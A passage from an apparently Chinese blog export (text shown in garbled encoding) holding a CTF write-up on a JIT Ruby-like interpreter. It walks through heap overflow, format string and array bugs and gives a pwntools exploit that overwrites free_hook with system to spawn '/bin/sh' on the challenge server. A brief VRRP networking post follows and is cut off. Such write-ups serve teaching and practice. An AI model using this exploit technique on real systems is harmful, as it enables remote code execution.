class="params">char *source</span>)</span></span><br><span class="line">     init();</span><br><span class="line">     lex(source);</span><br><span class="line">     parser();</span><br><span class="line">+    long memsz = <span class="number">0xFFFF</span> + <span class="number">1</span>;</span><br><span class="line">+    <span class="keyword">if</span> (mprotect(ntvCode, memsz, PROT_READ | PROT_EXEC)) &#123;</span><br><span class="line">+        perror(<span class="string">&quot;mprotect&quot;</span>);</span><br><span class="line">+        exit(<span class="number">1</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">     ((<span class="built_in">int</span> (*)(<span class="built_in">int</span> *, void **)) ntvCode)(<span class="number">0</span>, funcTable);</span><br><span class="line">     dispose();</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦æŒ–è¿™ä¸ªè§£é‡Šå™¨çš„rceã€‚</p><h1 id="å¯»æ‰¾æ¼æ´ç‚¹"><a href="#å¯»æ‰¾æ¼æ´ç‚¹" class="headerlink" title="å¯»æ‰¾æ¼æ´ç‚¹"></a>å¯»æ‰¾æ¼æ´ç‚¹</h1><h2 id="1-å †æº¢å‡ºï¼š"><a href="#1-å †æº¢å‡ºï¼š" class="headerlink" title="1.å †æº¢å‡ºï¼š"></a>1.å †æº¢å‡ºï¼š</h2><p>é¦–å…ˆæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå †æº¢å‡ºï¼Œæ˜¯å‡½æ•°åå’Œå˜é‡åçš„åœ°æ–¹ï¼Œå†™æ­»äº†ä¸º255 / 32ï¼Œè€Œè¾“å…¥é•¿åº¦æ˜¯ä»»æ„çš„ï¼Œä¼šå¯¼è‡´å †æº¢å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    char name[<span class="number">32</span>];</span><br><span class="line">    unsigned <span class="built_in">int</span> <span class="built_in">id</span>;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">type</span>;</span><br><span class="line">    <span class="built_in">int</span> loctype;</span><br><span class="line">&#125; Variable;</span><br><span class="line">static Variable *appendVar(char *name, <span class="built_in">int</span> <span class="built_in">type</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (functions.inside == IN_FUNC) &#123;</span><br><span class="line">        int32_t sz = <span class="number">1</span> + ++varSize[nowFunc];</span><br><span class="line">        strcpy(locVar[nowFunc][varCounter].name, name);</span><br><span class="line">        locVar[nowFunc][varCounter].<span class="built_in">type</span> = <span class="built_in">type</span>;</span><br><span class="line">        locVar[nowFunc][varCounter].<span class="built_in">id</span> = sz;</span><br><span class="line">        locVar[nowFunc][varCounter].loctype = V_LOCAL;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &amp;locVar[nowFunc][varCounter++];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (functions.inside == IN_GLOBAL) &#123;</span><br><span class="line">        /* <span class="keyword">global</span> varibale */</span><br><span class="line">        strcpy(gblVar.var[gblVar.count].name, name);</span><br><span class="line">        gblVar.var[gblVar.count].<span class="built_in">type</span> = <span class="built_in">type</span>;</span><br><span class="line">        gblVar.var[gblVar.count].loctype = V_GLOBAL;</span><br><span class="line">        gblVar.var[gblVar.count].<span class="built_in">id</span> = (uint32_t) &amp;ntvCode[ntvCount];</span><br><span class="line">        ntvCount += sizeof(int32_t); /* <span class="built_in">type</span> */</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &amp;gblVar.var[gblVar.count++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    <span class="built_in">int</span> address, args;</span><br><span class="line">    char name[<span class="number">0xFF</span>];</span><br><span class="line">&#125; func_t;</span><br><span class="line">static func_t *appendFunc(char *name, <span class="built_in">int</span> address, <span class="built_in">int</span> args)</span><br><span class="line">&#123;</span><br><span class="line">    functions.func[functions.count].address = address;</span><br><span class="line">    functions.func[functions.count].args = args;</span><br><span class="line">    strcpy(functions.func[functions.count].name, name);</span><br><span class="line">    <span class="keyword">return</span> &amp;functions.func[functions.count++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é€šè¿‡è°ƒè¯•å‘ç°è¿™ä¸ªæ´è§¦å‘å¤ªæ—©ï¼Œå¯¼è‡´è¦†ç›–äº†åé¢çš„nlineï¼Œç†è®ºä¸Šnlineåœ¨è¯­æ³•æ­£ç¡®çš„æ—¶å€™ä¸åº”è¯¥è¢«ç”¨åˆ°ï¼Œæˆ‘ä»¬ç»§ç»­è°ƒè¯•ï¼Œå‘ç°åˆ†è¯çš„æ—¶å€™ï¼Œåœ¨strncatå¤„å´©äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123; char val[<span class="number">32</span>]; <span class="built_in">int</span> nline; &#125; Token;</span><br><span class="line">struct &#123;</span><br><span class="line">    Token *tok;</span><br><span class="line">    <span class="built_in">int</span> size, pos;</span><br><span class="line">&#125; tok;</span><br><span class="line">int32_t lex(char *code)</span><br><span class="line">&#123;</span><br><span class="line">    int32_t codeSize = strlen(code), line = <span class="number">1</span>;</span><br><span class="line">    int32_t is_crlf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (int32_t i = <span class="number">0</span>; i &lt; codeSize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tok.size &lt;= i)</span><br><span class="line">            tok.tok = realloc(tok.tok, (tok.size += <span class="number">512</span> * sizeof(Token)));</span><br><span class="line">        if (isdigit(code[i])) &#123; // number?</span><br><span class="line">            <span class="keyword">for</span> (; isdigit(code[i]); i++)</span><br><span class="line">                strncat(tok.tok[tok.pos].val, &amp;(code[i]), <span class="number">1</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            i--;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; else if (isalpha(code[i])) &#123; // ident?</span><br><span class="line">            char *<span class="built_in">str</span> = tok.tok[tok.pos].val;</span><br><span class="line">            <span class="keyword">for</span> (; isalpha(code[i]) || isdigit(code[i]) || code[i] == <span class="string">&#x27;_&#x27;</span>; i++)</span><br><span class="line">                *<span class="built_in">str</span>++ = code[i]; // &lt; -- overwrite</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            i--;</span><br><span class="line">            tok.pos++;</span><br><span class="line">          &#125; else if (isalpha(code[i])) &#123; // ident?</span><br><span class="line">            char *<span class="built_in">str</span> = tok.tok[tok.pos].val;</span><br><span class="line">            <span class="keyword">for</span> (; isalpha(code[i]) || isdigit(code[i]) || code[i] == <span class="string">&#x27;_&#x27;</span>; i++)</span><br><span class="line">                *<span class="built_in">str</span>++ = code[i];</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            i--;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; else if (code[i] == &#x27; &#x27; || code[i] == &#x27;\t&#x27;) &#123; // space or tab?</span><br><span class="line">        &#125; else if (code[i] == &#x27;#&#x27;) &#123; // comment?</span><br><span class="line">            <span class="keyword">for</span> (i++; code[i] != <span class="string">&#x27;\n&#x27;</span>; i++) &#123; &#125; line++;</span><br><span class="line">        &#125; else if (code[i] == &#x27;&quot;&#x27;) &#123; // string?</span><br><span class="line">            strcpy(tok.tok[tok.pos].val, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            tok.tok[tok.pos++].nline = line;</span><br><span class="line">            <span class="keyword">for</span> (i++; code[i] != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; code[i] != <span class="string">&#x27;\0&#x27;</span>; i++)</span><br><span class="line">                strncat(tok.tok[tok.pos].val, &amp;(code[i]), <span class="number">1</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            <span class="keyword">if</span> (code[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">                error(<span class="string">&quot;%d: expected expression &#x27;\&quot;&#x27;&quot;</span>,</span><br><span class="line">                      tok.tok[tok.pos].nline);</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code[i] == <span class="string">&#x27;\n&#x27;</span> ||</span><br><span class="line">                   (is_crlf = (code[i] == <span class="string">&#x27;\r&#x27;</span> &amp;&amp; code[i + <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>))) &#123;</span><br><span class="line">            i += is_crlf;</span><br><span class="line">            strcpy(tok.tok[tok.pos].val, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line++;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            strncat(tok.tok[tok.pos].val, &amp;(code[i]), <span class="number">1</span>); // &lt; -- crash</span><br><span class="line">            <span class="keyword">if</span> (code[i + <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span> || (code[i] == <span class="string">&#x27;+&#x27;</span> &amp;&amp; code[i + <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span>) ||</span><br><span class="line">                (code[i] == <span class="string">&#x27;-&#x27;</span> &amp;&amp; code[i + <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                strncat(tok.tok[tok.pos].val, &amp;(code[++i]), <span class="number">1</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    tok.tok[tok.pos].nline = line;</span><br><span class="line">    tok.size = tok.pos - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“åŸå› æ²¡æœ‰ç»†ç©¶ï¼Œè¿™ä¸ªåœ°æ–¹çš„æ´å“ç›¸ä¸ä½³ï¼Œæˆ‘ä»¬åˆå»æŒ–åˆ«çš„æ´ã€‚</p><h2 id="2-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#2-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="2.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>2.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>ç„¶åæˆ‘ä»¬åˆçœ‹åˆ°ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½ç½®åœ¨å®ƒç°å®çš„printfå¤„ï¼Œå®ƒç›´æ¥æŠŠæˆ‘ä»¬çš„å‚æ•°ä¼ ç»™äº†libcçš„printfæ²¡æœ‰åšä»»ä½•æ ¡éªŒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static std_function stdfunc[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Array&quot;</span>, <span class="number">1</span>, <span class="number">12</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;rand&quot;</span>, <span class="number">0</span>, <span class="number">16</span>&#125;, &#123;<span class="string">&quot;printf&quot;</span>, -<span class="number">1</span>, <span class="number">20</span>&#125;, &#123;<span class="string">&quot;sleep&quot;</span>, <span class="number">1</span>, <span class="number">28</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;fopen&quot;</span>, <span class="number">2</span>, <span class="number">32</span>&#125;, &#123;<span class="string">&quot;fprintf&quot;</span>, -<span class="number">1</span>, <span class="number">36</span>&#125;, &#123;<span class="string">&quot;fclose&quot;</span>, <span class="number">1</span>, <span class="number">40</span>&#125;, &#123;<span class="string">&quot;fgets&quot;</span>, <span class="number">3</span>, <span class="number">44</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;free&quot;</span>, <span class="number">1</span>, <span class="number">48</span>&#125;, &#123;<span class="string">&quot;freeLocal&quot;</span>, <span class="number">0</span>, <span class="number">52</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> make_stdfunc(char *name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; sizeof(stdfunc) / sizeof(stdfunc[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strcmp(stdfunc[i].name, name)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!strcmp(name, <span class="string">&quot;Array&quot;</span>)) &#123;</span><br><span class="line">                // [...]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (stdfunc[i].args == -<span class="number">1</span>) &#123; // vector</span><br><span class="line">                    // [...]</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="built_in">int</span> arg = <span class="number">0</span>; arg &lt; stdfunc[i].args; arg++) &#123;</span><br><span class="line">                        relExpr();</span><br><span class="line">                        emit(<span class="number">0x89</span>); emit(<span class="number">0x44</span>); emit(<span class="number">0x24</span>); emit(arg * <span class="number">4</span>);</span><br><span class="line">                            // mov [esp+arg*<span class="number">4</span>], eax</span><br><span class="line">                        skip(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                emit(<span class="number">0xff</span>); emit(<span class="number">0x56</span>); emit(stdfunc[i].addr); // &lt; -- ç›´æ¥call printf</span><br><span class="line">                    // call $function</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œæ•ˆæœå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/82675864.png"></p><p>ç”±äºç¨‹åºå¼€å¯äº†PIEï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²åœ°å€ï¼Œè¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸å¥½æ³„æ¼åœ°å€ï¼Œæˆ‘ä»¬è½¬è€Œå»çœ‹å…¶å®ƒæ´ã€‚<br>ç»§ç»­è§‚å¯Ÿstdlib.cæ–‡ä»¶ï¼Œå‘ç°å®ƒå®ç°çš„arrayå¯ä»¥ç›´æ¥æ³„éœ²åœ°å€+ä»»æ„å†…å­˜è¯»å†™=ã€‚=ï¼š</p><h2 id="3-Arrayå¤„é€»è¾‘æ¼æ´"><a href="#3-Arrayå¤„é€»è¾‘æ¼æ´" class="headerlink" title="3.Arrayå¤„é€»è¾‘æ¼æ´"></a>3.Arrayå¤„é€»è¾‘æ¼æ´</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static std_function stdfunc[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Array&quot;</span>, <span class="number">1</span>, <span class="number">12</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;rand&quot;</span>, <span class="number">0</span>, <span class="number">16</span>&#125;, &#123;<span class="string">&quot;printf&quot;</span>, -<span class="number">1</span>, <span class="number">20</span>&#125;, &#123;<span class="string">&quot;sleep&quot;</span>, <span class="number">1</span>, <span class="number">28</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;fopen&quot;</span>, <span class="number">2</span>, <span class="number">32</span>&#125;, &#123;<span class="string">&quot;fprintf&quot;</span>, -<span class="number">1</span>, <span class="number">36</span>&#125;, &#123;<span class="string">&quot;fclose&quot;</span>, <span class="number">1</span>, <span class="number">40</span>&#125;, &#123;<span class="string">&quot;fgets&quot;</span>, <span class="number">3</span>, <span class="number">44</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;free&quot;</span>, <span class="number">1</span>, <span class="number">48</span>&#125;, &#123;<span class="string">&quot;freeLocal&quot;</span>, <span class="number">0</span>, <span class="number">52</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> make_stdfunc(char *name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; sizeof(stdfunc) / sizeof(stdfunc[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strcmp(stdfunc[i].name, name)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!strcmp(name, <span class="string">&quot;Array&quot;</span>)) &#123;</span><br><span class="line">                relExpr(); // get array size</span><br><span class="line">                emit(<span class="number">0xc1</span>); emit(<span class="number">0xe0</span> + EAX); emit(<span class="number">2</span>); // shl eax <span class="number">2</span></span><br><span class="line">                emit(<span class="number">0x89</span>); emit(<span class="number">0x04</span>); emit(<span class="number">0x24</span>); // mov [esp], eax</span><br><span class="line">                emit(<span class="number">0xff</span>); emit(<span class="number">0x56</span>); emit(<span class="number">12</span>); // call malloc</span><br><span class="line">                emit(<span class="number">0x50</span> + EAX); // push eax</span><br><span class="line">                emit(<span class="number">0x89</span>); emit(<span class="number">0x04</span>); emit(<span class="number">0x24</span>); // mov [esp], eax</span><br><span class="line">                emit(<span class="number">0xff</span>); emit(<span class="number">0x56</span>); emit(<span class="number">24</span>); // call add_mem</span><br><span class="line">                emit(<span class="number">0x58</span> + EAX); // pop eax</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><h1 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h1><p>æ‹¿åˆ°ubuntu 18.04çš„libcï¼›<br>ç›´æ¥ç”¨æ³„éœ²å‡ºçš„mallocçš„åœ°å€æ‹¿åˆ°libcåŸºå€ï¼›<br>å†™free_hookä¸ºsystemï¼›<br>å‘é€â€/bin/shâ€get shellï¼›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;./src/rubi&#x27;, &#x27;./poc.rb&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nc chall.0ops.sjtu.edu.cn 20202</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.0ops.sjtu.edu.cn&#x27;</span>, <span class="number">20202</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&lt;xxx.rb&gt;`.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x = [3]</span></span><br><span class="line"><span class="string">a:string = Array(100)</span></span><br><span class="line"><span class="string">a[x - a - 503040 + 1939664] = x - 503040 + 250448</span></span><br><span class="line"><span class="string">free(&quot;/bin/sh&quot;)&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2699390719.png"></p><p>ç»¼ä¸Šè¿™å°±æ˜¯ä¸€é“å¤§æ°´é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬æŠŠå®ƒåšçš„å¾ˆéº»çƒ¦ï¼Œå¹¶ä¸”è¿˜è¢«flagå˜²è®½äº†ä¸€æ³¢=ã€‚=</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VRRPå¤šç½‘å…³å®ç°è´Ÿè½½å‡è¡¡</title>
      <link href="2020/09/27/VRRP%E5%A4%9A%E7%BD%91%E5%85%B3%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>2020/09/27/VRRP%E5%A4%9A%E7%BD%91%E5%85%B3%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="VRRPç®€ä»‹"><a href="#VRRPç®€ä»‹" class="headerlink" title="VRRPç®€ä»‹"></a>VRRPç®€ä»‹</h2><blockquote><p>ä»‹ç»VRRPçš„å®šä¹‰å’Œä½œç”¨ã€‚</p></blockquote><h3 id="01-å®šä¹‰"><a href="#01-å®šä¹‰" class="headerlink" title="01 å®šä¹‰"></a>01 å®šä¹‰</h3><p>è™šæ‹Ÿè·¯ç”±å†—ä½™åè®®VRRPï¼ˆVirtual Router Redundancy Protocolï¼‰é€šè¿‡æŠŠå‡ å°è·¯ç”±è®¾å¤‡è”åˆç»„æˆä¸€å°è™šæ‹Ÿçš„è·¯ç”±è®¾å¤‡ï¼Œå°†è™šæ‹Ÿç½‘å…³è®¾å¤‡çš„IPåœ°å€ä½œä¸ºç”¨æˆ·çš„é»˜è®¤ç½‘å…³å®ç°ä¸å¤–éƒ¨ç½‘ç»œé€šä¿¡ã€‚å½“ç½‘å…³è®¾å¤‡å‘ç”Ÿæ•…éšœæ—¶ï¼ŒVRRPæœºåˆ¶èƒ½å¤Ÿé€‰ä¸¾æ–°çš„ç½‘å…³è®¾å¤‡æ‰¿æ‹…æ•°æ®æµé‡ï¼Œä»è€Œä¿éšœç½‘ç»œçš„å¯é é€šä¿¡ã€‚</p><h3 id="02-ç›®çš„"><a href="#02-ç›®çš„" class="headerlink" title="02 ç›®çš„"></a>02 ç›®çš„</h3><p>éšç€ç½‘ç»œçš„å¿«é€Ÿæ™®åŠå’Œç›¸å…³åº”ç”¨çš„æ—¥ç›Šæ·±å…¥ï¼Œå„ç§å¢å€¼ä¸šåŠ¡ï¼ˆå¦‚IPTVã€è§†é¢‘ä¼šè®®ç­‰ï¼‰å·²ç»å¼€å§‹å¹¿æ³›éƒ¨ç½²ï¼ŒåŸºç¡€ç½‘ç»œçš„å¯é æ€§æ—¥ç›Šæˆä¸ºç”¨æˆ·å…³æ³¨çš„ç„¦ç‚¹ï¼Œèƒ½å¤Ÿä¿è¯ç½‘ç»œä¼ è¾“ä¸ä¸­æ–­å¯¹äºç»ˆç«¯ç”¨æˆ·éå¸¸é‡è¦ã€‚</p><p>é€šå¸¸ï¼ŒåŒä¸€ç½‘æ®µå†…çš„æ‰€æœ‰ä¸»æœºä¸Šéƒ½å­˜åœ¨ä¸€æ¡ç›¸åŒçš„ã€ä»¥ç½‘å…³ä¸ºä¸‹ä¸€è·³çš„ç¼ºçœè·¯ç”±ã€‚ä¸»æœºå‘å¾€å…¶ä»–ç½‘æ®µçš„æŠ¥æ–‡å°†é€šè¿‡ç¼ºçœè·¯ç”±å‘å¾€ç½‘å…³ï¼Œå†ç”±ç½‘å…³è¿›è¡Œè½¬å‘ï¼Œä»è€Œå®ç°ä¸»æœºä¸å¤–éƒ¨ç½‘ç»œçš„é€šä¿¡ã€‚å½“ç½‘å…³å‘ç”Ÿæ•…éšœæ—¶ï¼Œæœ¬ç½‘æ®µå†…æ‰€æœ‰ä»¥ç½‘å…³ä¸ºç¼ºçœè·¯ç”±çš„ä¸»æœºå°†æ— æ³•ä¸å¤–éƒ¨ç½‘ç»œé€šä¿¡ã€‚å¢åŠ å‡ºå£ç½‘å…³æ˜¯æé«˜ç³»ç»Ÿå¯é æ€§çš„å¸¸è§æ–¹æ³•ï¼Œæ­¤æ—¶å¦‚ä½•åœ¨å¤šä¸ªå‡ºå£ä¹‹é—´è¿›è¡Œé€‰è·¯å°±æˆä¸ºéœ€è¦è§£å†³çš„é—®é¢˜ã€‚</p><p>VRRPçš„å‡ºç°å¾ˆå¥½çš„è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚VRRPèƒ½å¤Ÿåœ¨ä¸æ”¹å˜ç»„ç½‘çš„æƒ…å†µä¸‹ï¼Œé‡‡ç”¨å°†å¤šå°è·¯ç”±è®¾å¤‡ç»„æˆä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ï¼Œé€šè¿‡é…ç½®è™šæ‹Ÿè·¯ç”±å™¨çš„IPåœ°å€ä¸ºé»˜è®¤ç½‘å…³ï¼Œå®ç°é»˜è®¤ç½‘å…³çš„å¤‡ä»½ã€‚å½“ç½‘å…³è®¾å¤‡å‘ç”Ÿæ•…éšœæ—¶ï¼ŒVRRPæœºåˆ¶èƒ½å¤Ÿé€‰ä¸¾æ–°çš„ç½‘å…³è®¾å¤‡æ‰¿æ‹…æ•°æ®æµé‡ï¼Œä»è€Œä¿éšœç½‘ç»œçš„å¯é é€šä¿¡ã€‚</p><h3 id="03-å—ç›Š"><a href="#03-å—ç›Š" class="headerlink" title="03 å—ç›Š"></a>03 